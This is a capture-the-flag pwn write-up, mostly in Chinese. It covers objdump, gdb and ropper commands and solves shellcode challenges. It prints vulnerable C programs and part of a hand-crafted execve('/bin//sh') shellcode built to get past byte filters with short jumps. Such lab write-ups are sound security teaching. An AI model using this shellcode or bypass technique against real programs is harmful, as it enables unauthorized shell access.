# Write-up CTF 11/2023, Catogory: Pwn


## objdump commands
### objdump -h `<`executable`>`
查看執行檔的 section headers
- `Size` - section 的大小
- `VMA` - section _**預定**_ 映射 (mapping) 在記憶體中的虛擬地址 (virtual memory address)


## gdb commands
[gef –– GDB Enhanced Features 安裝教學](https://hugsy.github.io/gef/install/)


### x/`<`length/format/unit`>` `<`addr`>`
`x`: 檢查記憶體中的內容。x 是 examine 的縮寫\
length, format, unit 是可選的參數
#### length —— 顯示的單位數量
#### format —— 顯示格式
- `x` - hexadecimal (十六進制)
- `d` - decimal (十進制)
- `u` - unsigned decimal (無符號十進制)
- `o` - octal (八進制)
- `t` - binary (二進制)
- `a` - addr (地址)
- `i` - instruction (機器指令)
- `c` - char (字符)
- `s` - string (字串)
#### unit —— 顯示單位
- `b` - byte (8-bits)
- `h` - halfword (16-bits)
- `w` - word (32-bits)
- `g` - giant word (64-bits)

### checksec
檢查執行檔的安全性，是否開啟了 NX, PIE, RELRO, Canary 等等的保護機制。

### info proc mappings & vmmap
查看執行檔中，sections _**最終實際**_ 映射 (mapping) 在記憶體中的虛擬地址 (virtual memory address)
- `r` - 可讀
- `w` - 可寫
- `x` - 可執行
- `p` - 私有


## ropper commands
[Ropper 安裝教學](https://shantoroy.com/security/using-ropper-to-find-address-of-gadgets/)

### source venv/bin/activate; ropper
啟動 Ropper 交互式介面

### file `<`executable`>`
讀入 ELF 執行檔

### search `<`instruction`>`
尋找 ROP gadgets

_Example:_\
<img src="image/ropper_search.png" width="651" height="527">


## Challenges

### 03_Iamyourfather
#### Methods
* fork() –– Multi-Process
* Canary brute forcing
* ROP gadgets

<br/><br/><br/>

### 04_wakuwaku
#### Methods
* PLT –– Procedure Linkage Table
* GOT –– Global Offset Table

<br/><br/><br/>

### 05_shellcode
#### Methods
* Shellcode basic

#### Solving Process
題目有給 C code，先打開來看看：
```c
#include <stdlib.h>
#include <stdio.h>

void init() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	return;
}

int main() {
	init();
	char buf[200];

	puts("Input something in this buffer!!!");
	read(0, buf, 200);

	void (*func)() = (void (*)())buf;
	(*func)();

	return 0;
}
```
首先要了解 function pointer 的概念，可以參考 [C 語言中的函數指標](https://openhome.cc/Gossip/CGossip/FunctionPointer.html)。
\
\
\
\
\
為了更深刻得意會到這段程式碼在做什麼，使用 `objdump -d <executable>` 反組譯執行檔的 .text 區段，擷取出對應 C code 中的這兩行的組合語言：
```c
void (*func)() = (void (*)())buf;
(*func)();
```
```assembly
  401221:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
  401228:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40122c:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  401230:	b8 00 00 00 00       	mov    eax,0x0
  401235:	ff d2                	call   rdx
```
來解析一下這段組合語言在做什麼：

第1, 2行在把 `buf` 的值 寫入 `func` 的位址`[rbp-0x8]`\
第3~5行要呼叫 `func`\
明顯就是要讓 rip 跳到 stack segment 執行 `buf` 的內容 (shellcode)
\
\
\
\
\
用 `checksec` 檢查執行檔的安全屬性，可以看到 NX 沒開：
```terminal
[+] checksec for '/home/citrusalessia/CaptureTheFlag/05_shellcode/shellcode'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

所以接下來只要將 sys_execve 的 shellcode 寫入 `buf`，就可以成功了，
shellcode 可以參考 [shell-storm](http://shell-storm.org/shellcode/)，這裡使用的是 [Linux/x86 - execve(/bin/sh) Shellcode (21 bytes)](http://shell-storm.org/shellcode/files/shellcode-827.php)

<br/><br/><br/>

### 06_shellcode2
#### Methods
* Shellcode basic
* Shellcode crafting
* jmp instruction
* `read` syscall

#### Solving Process
題目有給 C code，先打開來看看：

```c
#include <stdlib.h>
#include <stdio.h>

void init() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	return;
}

int main() {
	init();
	char buf[200];

	puts("Input something in this buffer!!!");
	puts("However,you can't input 'nop' such as '0x90' this time!!!");
	puts("And also,you need to bypass some restrictions in your shellcode!!!");
	read(0, buf, 200);

	for (int i = 0; i < 200; i++) {
		if (buf[i] == '\x90') {
			puts("You can't input '0x90' this time!  :(( ");
			exit(0);
		}
	}

	for (int i = 0; i < 10; i++) {
		if (buf[i*20] != '\x0c' && buf[(i*20)+1] != '\x87' && buf[(i*20)+2] != '\x63') {
			puts("Try to bypass the restriction!!!");
			puts("Try again!!!");
			exit(0);
		}
	}

	void (*func)() = (void (*)())buf;
	(*func)();

	return 0;
}
```
可以看到這次的限制有兩個：
1. 不能輸入 `nop` (0x90)
2. 每 20 bytes 會檢查前三個 bytes 是否為 `0x0c 0x87 0x63`（好中二XD）

因此，能否用第一組 `0x0c 0x87 0x63` 為開頭湊出有效的指令集，並且使用 `jmp` 指令跳過剩下的 `0x0c 0x87 0x63`，就是解出這題的關鍵
\
\
\
\
\
利用 python 的 `pwntools` 來幫助我們湊出 shellcode：
```python
from pwn import *
context.update(arch='amd64', os='linux')
for i in range(0x100):
    print(disasm(b"\x0c\x87\x63" + bytes([i])))
    print()
```

`0x0c 0x87 0x63 0x56` 這對指令集好像不錯，只有影響到 `al` 和 `rsp`：
```assembly
   0:   0c 87                   or     al, 0x87
   2:   63                      .byte 0x63
   3:   56                      push   rsi
```

再用 `objdump -b binary -m i386:86-64 -M intel -D <executable>` 確認一次，和 `pwntools` 反組譯的結果一樣：
<img src="image/0c876356.png" width="880" height="240">
\
\
\
\
\
然而，實際用 gdb 動態追縱時，發現指令並不是先前預想的那樣：
<img src="image/0c876356_gdb.png" width="1000" height="500">

研究了一下為何會發生這種狀況，發現是因為電腦會將 `0x0c 0x87 0x63 0x56` 和緊跟在後的 `0x48` 解讀為第ㄧ、二行指令，順帶也影響到接續的指令：
```assembly
0c 87                	or     al, 0x87
63 56 48                movsxd edx, DWORD PTR [rsi+0x48]
31 f6                	xor    esi, esi                  ; <-- 預想是：48 31 f6                xor    rsi, rsi
```

因此，在湊好合適的指令集後，也需要留意有沒有上面的這種情況發生，以免影響到 shellcode 的執行\
幸好在本次的形況下無傷大雅，不過還是先改成 `0x0c 0x87 0x63 0xd0` 這一組指令集
\
\
\
\
\
此外，可以注意到 ```movsxd edx, DWORD PTR [rsi+0x48]``` 這行指令好像語法上有點怪怪的，\
其實 `MOVSXD r32, r/m32` 這語法是合法的，只是不鼓勵使用
<img src="image/movsxd_r32_rm32.png" width="1001" height="319">
\
\
\
\
\
為了順利執行 shellcode，我們需要找到一個合適的 `jmp` 指令來跳過剩餘的 `0x0c 0x87 0x63`，\
考慮到這題的限制，即每 17 bytes 必須形成一組有效的指令集，我們需要選擇一個盡可能少佔用字節的 `jmp` 指令，\
因此我選擇了 `short jump` 作為執行此操作的指令

下面是使用了 `short jump` 的ㄧ小段 shellcode：
```bash
# 0 ~ 3rd bytes
head="\x0c\x87\x63\xd0"
: << Instruction
0c 87                   or    al, 0x87
63 d0                   movsxd edx, eax
Instruction

# 4 ~ 19th bytes
shellcode_sys_exeve_part1="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\xeb\x04"
: << Instruction
48 31 f6                xor    rsi, rsi
56                      push   rsi
48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f  # encoded from "/bin//sh"
2f 73 68
eb 04                   jmp short +0x4  # (jmp short 0x4), jump to buf[24]
Instruction
```

<br/><br/><br/>

### 07_shellcode3
#### Methods
* Shellcode basic
* Shellcode crafting
* NOPs
* `read` syscall



